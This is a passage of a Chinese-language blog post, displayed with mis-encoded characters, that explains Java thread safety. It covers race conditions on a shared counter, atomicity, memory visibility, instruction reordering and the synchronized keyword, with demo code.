        <content type="html"><![CDATA[<h2 id="å¤šçº¿ç¨‹ç¯‡ä¸‰"><a href="#å¤šçº¿ç¨‹ç¯‡ä¸‰" class="headerlink" title="å¤šçº¿ç¨‹ç¯‡ä¸‰"></a>å¤šçº¿ç¨‹ç¯‡ä¸‰</h2><h3 id="å¦‚ç¬”è€…ç†è§£æœ‰è¯¯ï¼Œæ¬¢è¿äº¤æµæŒ‡æ­£â­"><a href="#å¦‚ç¬”è€…ç†è§£æœ‰è¯¯ï¼Œæ¬¢è¿äº¤æµæŒ‡æ­£â­" class="headerlink" title="å¦‚ç¬”è€…ç†è§£æœ‰è¯¯ï¼Œæ¬¢è¿äº¤æµæŒ‡æ­£â­"></a><strong>å¦‚ç¬”è€…ç†è§£æœ‰è¯¯ï¼Œæ¬¢è¿äº¤æµæŒ‡æ­£â­</strong></h3><h3 id="çº¿ç¨‹å®‰å…¨"><a href="#çº¿ç¨‹å®‰å…¨" class="headerlink" title="çº¿ç¨‹å®‰å…¨"></a>çº¿ç¨‹å®‰å…¨</h3><p><u>åˆ’é‡ç‚¹ï¼ï¼ï¼</u></p><h4 id="ä»€ä¹ˆæ˜¯çº¿ç¨‹å®‰å…¨"><a href="#ä»€ä¹ˆæ˜¯çº¿ç¨‹å®‰å…¨" class="headerlink" title="ä»€ä¹ˆæ˜¯çº¿ç¨‹å®‰å…¨"></a>ä»€ä¹ˆæ˜¯çº¿ç¨‹å®‰å…¨</h4><p>æƒ³å¯¹çº¿ç¨‹å®‰å…¨åšä¸€ä¸ªå…·ä½“æ¸…æ™°çš„è§£é‡Šå¾ˆå›°éš¾ï¼Œä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´ï¼Ÿå½“ç„¶æ˜¯å…·ä½“æƒ…å†µå…·ä½“åˆ†æ.ï¼ˆå°±åƒå¾ˆå¤šäººéƒ½å–œæ¬¢åƒé¢æ¡ æœ‰çš„äººå–œæ¬¢åƒç‚¸é…± æœ‰çš„äººå–œæ¬¢åƒåˆ€å‰Šã€å…¶ä»–ä¸å…·ä½“æ‹“å±• å› ä¸ºé¥¿äº†wã€‘å¯ä»¥å…·ä½“ç»†åˆ†ï¼‰</p><p>ä½†æ˜¯ï¼æˆ‘ä»¬å¯ä»¥è¿™æ ·è®¤ä¸º <strong>å¦‚æœå¤šçº¿ç¨‹ç¯å¢ƒä¸‹ä»£ç è¿è¡Œçš„ç»“æœæ˜¯ç¬¦åˆæˆ‘ä»¬é¢„æœŸçš„ ï¼Œå³ä½¿åœ¨å•çº¿ç¨‹ç¯å¢ƒåº”å¾—çš„ç»“æœï¼Œåˆ™è¯´æ˜è¿™ä¸ªçº¿ç¨‹æ˜¯å®‰å…¨çš„.</strong></p><h4 id="äº§ç”Ÿçº¿ç¨‹å®‰å…¨çš„åŸå› "><a href="#äº§ç”Ÿçº¿ç¨‹å®‰å…¨çš„åŸå› " class="headerlink" title="äº§ç”Ÿçº¿ç¨‹å®‰å…¨çš„åŸå› "></a>äº§ç”Ÿçº¿ç¨‹å®‰å…¨çš„åŸå› </h4><h5 id="æŠ¢å å¼æ‰§è¡Œï¼ˆç³»ç»Ÿå†…æ ¸ï¼‰"><a href="#æŠ¢å å¼æ‰§è¡Œï¼ˆç³»ç»Ÿå†…æ ¸ï¼‰" class="headerlink" title="æŠ¢å å¼æ‰§è¡Œï¼ˆç³»ç»Ÿå†…æ ¸ï¼‰"></a>æŠ¢å å¼æ‰§è¡Œï¼ˆç³»ç»Ÿå†…æ ¸ï¼‰</h5><p>ä¸Šæˆ‘ä»¬ç†Ÿæ‚‰çš„å®ä¾‹ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// çº¿ç¨‹å®‰å…¨</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo13</span> &#123;</span><br><span class="line">    <span class="comment">// æ­¤å¤„å®šä¹‰ä¸€ä¸ª int ç±»å‹çš„å˜é‡</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">locker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">locker2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="comment">// å¯¹ count å˜é‡è¿›è¡Œè‡ªå¢ 5w æ¬¡</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">50000</span>; i++) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="comment">// å¯¹ count å˜é‡è¿›è¡Œè‡ªå¢ 5w æ¬¡</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">50000</span>; i++) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        </span><br><span class="line">        t1.join();</span><br><span class="line">        t2.join();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é¢„æœŸç»“æœåº”è¯¥æ˜¯ 10w</span></span><br><span class="line">        System.out.println(<span class="string">&quot;count: &quot;</span> + count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„é¢„æœŸæƒ…å†µæ˜¯è¾“å‡º100000 ä½†æ˜¯å®é™…è¿è¡Œç»“æœå¦‚ä¸‹<br>![img](C:\Users\lenovo\Documents\Tencent Files\3023536144\nt_qq\nt_data\Pic\2024-09\Ori\6060fd35ca0792320d83c150d9658e61.png)<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/6583569de40471cab8baeaa743a94490.png" alt="img"><br>ä¸æ˜¯é¢„æœŸå€¼ä¸”å¯ä»¥å‘ç°å¤šæ¬¡è¿è¡Œçš„ç»“æœå¹¶ä¸ç›¸åŒ<br>è¿™æ˜¯ä¸ºä»€ä¹ˆï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">50000</span>; i++) &#123;</span><br><span class="line">                count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™éƒ¨åˆ†ä»£ç å°±æ˜¯å…¸å‹çš„çº¿ç¨‹å®‰å…¨é—®é¢˜.<br>t1å’Œt2è¿™ä¸¤ä¸ªå•ç‹¬çš„çº¿ç¨‹åœ¨å•ç‹¬æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œæ¯«æ— ç–‘é—®æ²¡æœ‰ä»»ä½•é—®é¢˜.<br>ä½†æ˜¯t1å’Œt2ä¸¤ä¸ªçº¿ç¨‹å¹¶å‘æ‰§è¡Œä¸Šè¿°å¾ªç¯ï¼Œä¼šå‡ºç°é€»è¾‘ä¸Šçš„é—®é¢˜.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">t1.start();</span><br><span class="line">t2.start();</span><br><span class="line"></span><br><span class="line">t1.join();</span><br><span class="line">t2.join();</span><br></pre></td></tr></table></figure><p>è¿™æ ·æ˜¯t1å’Œt2åŒæ—¶æ‰§è¡Œï¼Œ<strong>å¤šä¸ªçº¿ç¨‹æ‰§è¡Œä¸Šè¿°ä»£ç æ—¶ï¼Œç”±äºçº¿ç¨‹ä¹‹é—´çš„è°ƒåº¦é¡ºåºæ˜¯â€éšæœºâ€çš„ï¼Œåœ¨æŸäº›è°ƒåº¦é¡ºåºä¸‹ä¼šå‡ºç°é€»è¾‘é—®é¢˜.</strong></p><p>ç«™åœ¨CPUçš„è§’åº¦ä¸Šï¼Œcount++æ˜¯ç”±CPUçš„ä¸‰ä¸ªæŒ‡ä»¤å®ç°çš„.<br><strong>1.load æŠŠæ•°æ®ä»å†…å­˜ä¸­è¯»å–åˆ°CPUä¸­</strong><br><strong>2.add æŠŠå¯„å­˜å™¨ä¸­çš„æ•°æ®è¿›è¡Œ+1</strong><br><strong>3.save æŠŠå¯„å­˜å™¨ä¸­çš„æ•°æ®ä¿å­˜åˆ°å†…å­˜ä¸­</strong><br>åœ¨ä¸Šè¿°3ä¸ªæ­¥éª¤æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå…¶å®æœ‰æ— æ•°ç§æ’åˆ—ç»„åˆçš„æ–¹å¼.<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/8eebd2c9a733557a88b615a436b3f313.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/7f8cc7702ada4c77687645064776fb3e.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/7f8cc7702ada4c77687645064776fb3e.png"><br>ä¸Šè¿°ä»£ç æ‰§è¡Œå®Œä¹‹åå‘ç°äº†bug<br>ä¸¤ä¸ªçº¿ç¨‹æœ¬åº”è¯¥æ˜¯åˆ†åˆ«è‡ªå¢1æ¬¡ï¼Œä½†2ä¸ªçº¿ç¨‹åœ¨è‡ªå¢è¿‡ç¨‹ä¸­å¹¶æ²¡æœ‰ç´¯åŠ è€Œæ˜¯å„è‡ªç‹¬ç«‹è¿è¡Œï¼Œæ•…é¢„æœŸå¾—åˆ°2ï¼Œå®é™…åªæœ‰1.ã€ç¡®å®å¤Ÿâ€éšæœºâ€ ç¬‘ã€‘<br><strong>æ³¨æ„ æˆ‘ä»¬å¾—åˆ°çš„â€éšæœºå€¼â€ä¸€å®šå°äº100000ä½†ä¹Ÿå­˜åœ¨å°äº50000çš„å€¼ï¼ˆå¦‚æœt1è‡ªå¢ä¸€æ¬¡çš„è¿‡ç¨‹ä¸­ t2è‡ªå¢å¤šæ¬¡ã€å¦‚2æ¬¡ã€‘ç›¸å½“äºè‡ªå¢äº†3æ¬¡ åªæœ‰ä¸€æ¬¡ç”Ÿæ•ˆäº†ï¼‰</strong><br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/f9eb21be4d4d398e98269acd8cb9d911.png" alt="img"><br>æ€ä¹ˆæ ·ä¿æŒt1æ‰§è¡Œå®Œå†æ‰§è¡Œt2å‘¢ï¼Ÿ<br>æ§åˆ¶t1æ‰§è¡Œæ—¶t2æœªå¯åŠ¨å³å¯.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// çº¿ç¨‹å®‰å…¨</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo13</span> &#123;</span><br><span class="line">    <span class="comment">// æ­¤å¤„å®šä¹‰ä¸€ä¸ª int ç±»å‹çš„å˜é‡</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">locker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">locker2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="comment">// å¯¹ count å˜é‡è¿›è¡Œè‡ªå¢ 5w æ¬¡</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">50000</span>; i++) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="comment">// å¯¹ count å˜é‡è¿›è¡Œè‡ªå¢ 5w æ¬¡</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">50000</span>; i++) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¦‚æœæ²¡æœ‰è¿™ä¿© join, è‚¯å®šä¸è¡Œçš„. çº¿ç¨‹è¿˜æ²¡è‡ªå¢å®Œ, å°±å¼€å§‹æ‰“å°äº†. å¾ˆå¯èƒ½æ‰“å°å‡ºæ¥çš„ count å°±æ˜¯ä¸ª 0</span></span><br><span class="line">        t1.start();</span><br><span class="line">        t1.join();</span><br><span class="line"></span><br><span class="line">        t2.start();</span><br><span class="line">        t2.join();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é¢„æœŸç»“æœåº”è¯¥æ˜¯ 10w</span></span><br><span class="line">        System.out.println(<span class="string">&quot;count: &quot;</span> + count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="åŒä¸€ä¸ªå˜é‡è¢«ä¸¤ä¸ªçº¿ç¨‹éƒ½ä¿®æ”¹"><a href="#åŒä¸€ä¸ªå˜é‡è¢«ä¸¤ä¸ªçº¿ç¨‹éƒ½ä¿®æ”¹" class="headerlink" title="åŒä¸€ä¸ªå˜é‡è¢«ä¸¤ä¸ªçº¿ç¨‹éƒ½ä¿®æ”¹"></a>åŒä¸€ä¸ªå˜é‡è¢«ä¸¤ä¸ªçº¿ç¨‹éƒ½ä¿®æ”¹</h5><p>è§£å†³æ–¹æ³•ï¼š</p><p><u>1.ä¸€ä¸ªçº¿ç¨‹å¯¹åŒä¸€ä¸ªå˜é‡è¿›è¡Œä¿®æ”¹ ok</u><br><u>2.ä¸¤ä¸ªçº¿ç¨‹é’ˆå¯¹ä¸åŒå˜é‡è¿›è¡Œä¿®æ”¹</u><br><u>3.ä¸¤ä¸ªçº¿ç¨‹é’ˆå¯¹ä¸€ä¸ªå˜é‡è¯»å–</u></p><h5 id="éåŸå­çš„ä¿®æ”¹æ“ä½œ"><a href="#éåŸå­çš„ä¿®æ”¹æ“ä½œ" class="headerlink" title="éåŸå­çš„ä¿®æ”¹æ“ä½œ"></a>éåŸå­çš„ä¿®æ”¹æ“ä½œ</h5><h6 id="ä»€ä¹ˆæ˜¯åŸå­æ€§"><a href="#ä»€ä¹ˆæ˜¯åŸå­æ€§" class="headerlink" title="ä»€ä¹ˆæ˜¯åŸå­æ€§"></a>ä»€ä¹ˆæ˜¯åŸå­æ€§</h6><p>æ¯”å¦‚æˆ‘ï¼ˆçº¿ç¨‹Aï¼‰ç™»å½•ä¸€ä¸ªæ‰‹æ¸¸ï¼ˆä¸€æ®µä»£ç ï¼‰ï¼Œåœ¨æˆ‘æœªé€€å‡ºæ¸¸æˆæ—¶ï¼Œæˆ‘ä»¬çš„æ¸¸æˆå¥½å‹ï¼ˆçº¿ç¨‹Bï¼‰ä¹Ÿå¯ä»¥ç™»å½•æ¸¸æˆç»„é˜Ÿæ‰“æœ¬.ï¼ˆæ‰“æ–­æˆ‘åœ¨æ¸¸æˆä¸­çš„éšç§ï¼‰<strong>è¿™å°±æ˜¯ä¸å…·å¤‡åŸå­æ€§</strong><br>å¬èµ·æ¥æ˜¯ä¸æ˜¯å’ŒæŠ¢å å¼å¾ˆåƒï¼ŸçœŸèªæ˜hh<br><strong>å¦‚æœçº¿ç¨‹ä¸æ˜¯â€œæŠ¢å â€çš„å°±ç®—æ²¡æœ‰åŸå­æ€§</strong></p><p><strong>ä¸€ä¸ªjavaè¯­å¥ä¸ä¸€å®šæ˜¯åŸå­çš„ï¼Œä¹Ÿä¸ä¸€å®šåªæ˜¯ä¸€æ¡æŒ‡ä»¤</strong></p><p>ä¸Šè¿°count++å…ˆè¿›è¡Œ äº†è¯»å–å†è¿›è¡Œä¿®æ”¹æ“ä½œ<br><strong>è‹¥ä¸€æ®µé€»è¾‘ä¸­å­˜åœ¨è¦æ ¹æ®ä¸€å®šæ¡ä»¶å†³å®šæ˜¯å¦ä¿®æ”¹ä¹Ÿå­˜åœ¨ç±»ä¼¼çš„é—®é¢˜</strong></p><p>è§£å†³æ–¹æ³•ï¼šæƒ³åŠæ³•è®©count++ä¸€æ¬¡æ€§è¢«è¢«CPUå®Œæˆä¸Šè¿°3ä¸ªæ­¥éª¤</p><h5 id="å†…å­˜å¯è§æ€§é—®é¢˜"><a href="#å†…å­˜å¯è§æ€§é—®é¢˜" class="headerlink" title="å†…å­˜å¯è§æ€§é—®é¢˜"></a>å†…å­˜å¯è§æ€§é—®é¢˜</h5><p>å¯è§æ€§æŒ‡çš„æ˜¯ä¸€ä¸ªçº¿ç¨‹å…±äº«å˜é‡å€¼çš„ä¿®æ”¹èƒ½è¢«å…¶ä»–çº¿ç¨‹çœ‹åˆ°<br>Javaå†…å­˜æ¨¡å‹ï¼ˆJMMï¼‰Javaè™šæ‹Ÿæœºè§„èŒƒäº†Javaå†…å­˜æ¨¡å‹<br><strong>ç›®çš„æ˜¯å±è”½æ‰å„ç§ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿçš„å†…å­˜è®¿é—®å·®å¼‚ ä»¥å®ç°Javaç¨‹åºåœ¨å„ç§å¹³å°ä¸‹éƒ½èƒ½è¾¾åˆ°ä¸€è‡´çš„å¹¶å‘æ•ˆæœ</strong><br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/ab40b99fbec360df60d19629d5f8a751.png" alt="img"><br>çº¿ç¨‹ä¹‹é—´å…±äº«å˜é‡å­˜å‚¨åœ¨ä¸»å†…å­˜ä¸­<br>æ¯ä¸€ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„â€å·¥ä½œå†…å­˜â€<br>å½“çº¿ç¨‹è¦è¯»å–ä¸€ä¸ªå…±äº«å˜é‡çš„æ—¶å€™ ä¼šå…ˆæŠŠå˜é‡ä»ä¸»å†…å­˜æ‹·è´åˆ°å·¥ä½œå†…å­˜ä¸­ å†ä»å·¥ä½œå†…å­˜è¯»å–æ•°æ®<br>å½“çº¿ç¨‹è¦ä¿®æ”¹ä¸€ä¸ªå…±äº«å˜é‡çš„æ—¶å€™ ä¼šå…ˆä¿®æ”¹å·¥ä½œå†…å­˜ä¸­çš„å‰¯æœ¬ å†åŒæ­¥å›ä¸»å†…å­˜<br>**å·¥ä½œå†…å­˜åƒæ˜¯ä¸€ä¸ªâ€æ¢çº½â€ å…¶å®å°±æ˜¯CPUçš„å¯„å­˜å™¨å’Œé«˜é€Ÿç¼“å­˜ **</p><h5 id="æŒ‡ä»¤é‡æ’åºé—®é¢˜"><a href="#æŒ‡ä»¤é‡æ’åºé—®é¢˜" class="headerlink" title="æŒ‡ä»¤é‡æ’åºé—®é¢˜"></a>æŒ‡ä»¤é‡æ’åºé—®é¢˜</h5><p>æ¯”å¦‚æˆ‘ä»¬ç”¨ä»£ç å®ç°<br>1.å»èŒ¶è¯å¼„å–é¤<br>2.å»èœé¸Ÿæ‹¿å¿«é€’<br>3.å»ä¹°æ›¹æ°</p><p>å¦‚æœæ˜¯åœ¨å•çº¿ç¨‹æƒ…å†µä¸‹ï¼ŒJVMã€CPUæŒ‡ä»¤é›†ä¼šå¯¹å…¶è¿›è¡Œä¼˜åŒ–ï¼Œä¸æ­¢æ˜¯è§„è§„çŸ©çŸ©æŒ‰1-&gt;2-&gt;3æ‰§è¡Œï¼Œè€Œæ˜¯å¯ä»¥æŒ‰1-&gt;3-&gt;2æ‰§è¡Œ(å…¶ä»–é¡ºåºä¹Ÿå¯ä»¥)è¿™å°±å«<strong>æŒ‡ä»¤é‡æ’åº</strong>.</p><p>å¦‚ä½•è§£å†³ä¸Šè¿°é—®é—®é¢˜å‘¢ï¼Ÿ<br><strong>ç®€å•æš´åŠ›ï¼šåŠ é”ï¼</strong></p><h4 id="è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜çš„æ–¹æ³•"><a href="#è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜çš„æ–¹æ³•" class="headerlink" title="è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜çš„æ–¹æ³•"></a>è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜çš„æ–¹æ³•</h4><h5 id="synchronizedå…³é”®å­—"><a href="#synchronizedå…³é”®å­—" class="headerlink" title="synchronizedå…³é”®å­—"></a>synchronizedå…³é”®å­—</h5><h6 id="ç‰¹æ€§ä¸€äº’æ–¥"><a href="#ç‰¹æ€§ä¸€äº’æ–¥" class="headerlink" title="ç‰¹æ€§ä¸€äº’æ–¥"></a>ç‰¹æ€§ä¸€äº’æ–¥</h6><p><strong>synchronizedä¼šèµ·åˆ°äº’æ–¥æ•ˆæœï¼ŒæŸä¸ªçº¿ç¨‹æ‰§è¡Œåˆ°æŸä¸ªå¯¹è±¡çš„synchronizedä¸­æ—¶ï¼Œå…¶ä»–çº¿ç¨‹å¦‚æœä¹Ÿæ‰§è¡Œåˆ°åŒä¸€ä¸ªå¯¹è±¡çš„synchronized</strong><br>synchronizedç”¨çš„é”å­˜åœ¨äºJavaå¯¹è±¡é‡Œ.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> () &#123;</span><br><span class="line">         count++;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>()ä¸­éœ€è¦è¡¨ç¤ºä¸€ä¸ªç”¨æ¥åŠ é”çš„å¯¹è±¡.<strong>å¯¹è±¡æ˜¯ä»€ä¹ˆä¸é‡è¦ï¼Œåªæ˜¯é€šè¿‡è¿™ä¸ªå¯¹è±¡åŒºåˆ†ä¸¤ä¸ªçº¿ç¨‹æ˜¯éƒ½åœ¨ç«äº‰ä¸€ä¸ªåŒä¸€ä¸ªé”</strong></p><p><u><strong>å¦‚æœä¸¤ä¸ªçº¿ç¨‹æ˜¯é’ˆå¯¹åŒä¸€ä¸ªå¯¹è±¡åŠ é” å°±ä¼šå‡ºç°é”ç«äº‰</strong></u><br><u></u><br><strong><u>å¦‚æœä¸æ˜¯äº‰å¯¹åŒä¸€ä¸ªå¯¹è±¡è¿›è¡ŒåŠ é”å°±æ˜¯æ­£å¸¸çš„å¹¶å‘æ‰§è¡Œ</strong></u></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">50000</span>; i++) &#123;</span><br><span class="line">               <span class="keyword">synchronized</span> (locker) &#123;</span><br><span class="line">                   count++;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å†™ä¸¤ä¸ªçº¿ç¨‹çš„æ‰§è¡Œé¡ºåºå°±ä¼šç›¸äº’å½±å“ å¯ä»¥ç†è§£ä¸º**â€å¹¶å‘æ‰§è¡Œâ€è½¬å˜ä¸ºâ€ä¸²è¡Œæ‰§è¡Œâ€**(ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶å°è¯•å¯¹ä¸€ä¸ªå¯¹è±¡åŠ é”ï¼Œå‡ºç°é”ç«äº‰ï¼Œä¸€ä¸ªçº¿ç¨‹èƒ½æ‹¿åˆ°çº¿ç¨‹è¢­å‡»æ‰§è¡Œï¼Œå¦ä¸€ä¸ªçº¿ç¨‹åªèƒ½é˜»å¡ç­‰å¾….ç­‰å‰ä¸€ä¸ªçº¿ç¨‹é‡Šæ”¾é”ä¹‹åï¼Œæ‰æœºä¼šæ‹¿åˆ°é”ç»§ç»­æ‰§è¡Œ.)<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/8723f06e17a89162e2d1f629149d345f.png" alt="img"></p><h6 id="ç‰¹æ€§äºŒåˆ·æ–°å†…å­˜"><a href="#ç‰¹æ€§äºŒåˆ·æ–°å†…å­˜" class="headerlink" title="ç‰¹æ€§äºŒåˆ·æ–°å†…å­˜"></a>ç‰¹æ€§äºŒåˆ·æ–°å†…å­˜</h6><p>synchronizedå·¥ä½œè¿‡ç¨‹ï¼š<br>1.è·å¾—äº’æ–¥é”<br>2.ä»ä¸»å­˜æ‹·è´å˜é‡çš„æœ€æ–°å‰¯æœ¬åˆ°å·¥ä½œå†…å­˜ä¸­<br>3.æ‰§è¡Œä»£ç <br>4.å°†æ›´æ”¹åçš„å…±äº«å˜é‡çš„å€¼åˆ·æ–°åˆ°ä¸»å†…å­˜<br>5.é‡Šæ”¾äº’æ–¥é”</p><p><strong>synchronizedä¹Ÿèƒ½ä¿å­˜å†…å­˜å¯è§æ€§</strong>ã€å¾…è€ƒè¯ æ‰’æºç ä¸€æ¢ç©¶ç«ŸğŸ˜€ã€‘</p><h6 id="ç‰¹æ€§ä¸‰å¯é‡å…¥"><a href="#ç‰¹æ€§ä¸‰å¯é‡å…¥" class="headerlink" title="ç‰¹æ€§ä¸‰å¯é‡å…¥"></a>ç‰¹æ€§ä¸‰å¯é‡å…¥</h6><p>synchronizedåŒæ­¥å—å¯¹åŒä¸€æ¡çº¿ç¨‹æ¥è¯´æ˜¯å¯é‡å…¥çš„ï¼Œä¸ä¼šå‡ºç°æŠŠè‡ªå·±é”æ­»çš„æƒ…å†µ.ï¼ˆæŒ‡çš„å°±æ˜¯ä¸€ä¸ªçº¿ç¨‹è¿ç»­å¯¹ä¸€æŠŠé”åŠ é”ä¸¤æ¬¡ä¸ä¼šå‡ºç°æ­»é”å³ä¸ºâ€å¯é‡å…¥â€ï¼‰<br><strong>è®©é”è®°å½•å“ªä¸ªçº¿ç¨‹è®©å®ƒè¢«é”ä½ åç»­å†åŠ é”çš„æ—¶å€™ å¦‚æœåŠ é”çº¿ç¨‹å°±æ˜¯æŒæœ‰é”çš„çº¿ç¨‹å°±ç›´æ¥åŠ é”æˆåŠŸ</strong><br>æ¯”å¦‚è¯´ä½ ç¿˜è¯¾äº† åˆšå¥½è€å¸ˆç‚¹åä½ ä¸åœ¨ ä½ å°±è¢«è€å¸ˆæ ‡è®°äº†<br>ä¸‹ä¸€æ¬¡è€å¸ˆç‚¹åè‚¯å®šä¸ä¼šæ‹’ç»ä¼šå†ç‚¹ä¸€æ¬¡ä½ (æ— æ¶æ„ é—®å°±æ˜¯è¡€æ³ªå²)<br>å¦‚æœæ¢æˆä¸€ä¸ªç»å¸¸åå‰æ’çš„åŒå­¦é‚£å°±ä¸ä¼šæ˜¯è¿™ä¸ªç»“æœäº†.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 